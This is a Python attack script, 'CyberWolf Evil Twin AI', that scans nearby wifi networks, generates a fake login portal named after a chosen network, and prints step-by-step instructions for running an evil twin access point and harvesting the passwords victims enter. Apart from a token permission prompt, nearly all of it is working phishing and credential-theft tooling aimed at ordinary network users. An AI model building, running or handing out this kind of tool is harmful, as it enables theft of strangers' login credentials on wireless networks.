#!/usr/bin/env python3
"""
CyberWolf Evil Twin AI - Simple Working Version
"""

import subprocess
import os
import time

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║            🐺 CYBERWOLF AI EVIL TWIN FRAMEWORK 🐺               ║
║         ⚠️  AUTHORIZED USE ONLY ⚠️                             ║
╚══════════════════════════════════════════════════════════════════╝
    """)

def check_permission():
    print("\n[!] LEGAL REQUIREMENT")
    print("This tool is for EDUCATIONAL and AUTHORIZED testing only.\n")
    answer = input("Do you have written permission to test? (yes/no): ")
    if answer.lower() not in ['yes', 'y']:
        print("\n[!] Authorization required. Exiting.")
        return False
    return True

def start_monitor_mode():
    print("\n[*] Starting monitor mode...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
    result = subprocess.run(["sudo", "airmon-ng", "start", "wlan0"], capture_output=True)
    if result.returncode == 0:
        print("[+] Monitor mode active on wlan0mon")
        return True
    else:
        print("[-] Failed to start monitor mode")
        return False

def scan_networks():
    print("\n[*] Scanning for networks (15 seconds)...")
    
    # Start airodump
    scan_process = subprocess.Popen(
        ["sudo", "airodump-ng", "wlan0mon", "--write", "/tmp/scan", "--output-format", "csv"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    
    # Show progress
    for i in range(15):
        print(f"\r[*] Scanning... {15-i} seconds remaining", end="")
        time.sleep(1)
    
    scan_process.terminate()
    time.sleep(2)
    print("\n[+] Scan complete!")
    
    # Parse results
    networks = []
    try:
        with open("/tmp/scan-01.csv", "r") as f:
            lines = f.readlines()
        
        for line in lines:
            if "WPA" in line or "WEP" in line or "OPEN" in line:
                parts = line.split(',')
                if len(parts) >= 14:
                    bssid = parts[0].strip()
                    channel = parts[3].strip()
                    essid = parts[13].strip() if len(parts) > 13 else "Hidden"
                    if bssid and bssid != "BSSID" and essid and essid != "":
                        networks.append({
                            'bssid': bssid,
                            'channel': channel,
                            'essid': essid
                        })
    except:
        pass
    
    # Display networks
    if networks:
        print("\n[+] Available Networks:")
        print("-" * 60)
        for i, net in enumerate(networks[:10]):
            print(f"  {i+1}. {net['essid']} (Channel {net['channel']}) - {net['bssid']}")
        print("-" * 60)
    else:
        print("\n[-] No networks found. Try again or check your WiFi card.")
    
    return networks

def generate_phishing_page(ssid):
    """Generate a simple phishing page"""
    os.makedirs("portals", exist_ok=True)
    
    html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Network Authentication</title>
    <style>
        body {{
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }}
        .container {{
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.3);
            width: 350px;
        }}
        h2 {{ color: #333; margin-bottom: 20px; }}
        input {{
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }}
        button {{
            width: 100%;
            padding: 10px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }}
        button:hover {{ background: #45a049; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 {ssid} Portal</h2>
        <p>Please sign in to continue using the network.</p>
        <form action="/capture" method="POST">
            <input type="text" name="username" placeholder="Email or Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <p style="margin-top: 20px; font-size: 12px; color: #999; text-align: center;">
            Protected by secure encryption
        </p>
    </div>
</body>
</html>'''
    
    filename = f"portals/{ssid.replace(' ', '_')}.html"
    with open(filename, 'w') as f:
        f.write(html)
    
    print(f"[+] Phishing page saved: {filename}")
    return filename

def stop_monitor_mode():
    print("\n[*] Cleaning up...")
    subprocess.run(["sudo", "airmon-ng", "stop", "wlan0mon"], capture_output=True)
    subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], capture_output=True)
    print("[+] Monitor mode stopped")

def main():
    clear_screen()
    banner()
    
    if not check_permission():
        return
    
    if not start_monitor_mode():
        return
    
    networks = scan_networks()
    
    if not networks:
        stop_monitor_mode()
        return
    
    # Select target
    try:
        choice = int(input("\n[?] Select target number: ")) - 1
        target = networks[choice]
    except:
        print("[-] Invalid selection")
        stop_monitor_mode()
        return
    
    print(f"\n[+] Target selected: {target['essid']}")
    
    # Generate phishing page
    print("\n[*] AI Generating phishing portal...")
    portal_path = generate_phishing_page(target['essid'])
    
    # Instructions
    print("\n" + "="*60)
    print("📋 ATTACK INSTRUCTIONS")
    print("="*60)
    print(f"""
1. Open 3 NEW terminals:

   Terminal 1 - Start Evil Twin AP:
   ---------------------------------
   sudo airgeddon

   (Select wlan0mon → Evil Twin Attacks → Choose target)

   Terminal 2 - Serve phishing page:
   ---------------------------------
   cd ~/cyberwolf-evil-twin/portals
   sudo python3 -m http.server 80

   Terminal 3 - Monitor credentials:
   --------------------------------
   sudo tail -f /var/log/apache2/access.log
   (or check the HTTP server logs)

2. Wait for victims to connect and enter credentials

3. Captured credentials will appear in Terminal 3
""")
    
    print(f"[!] Phishing page location: {portal_path}")
    print(f"[!] Target SSID: {target['essid']}")
    print(f"[!] Target Channel: {target['channel']}")
    
    input("\nPress Enter to cleanup and exit...")
    stop_monitor_mode()
    print("\n[+] Done. Stay ethical!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        stop_monitor_mode()
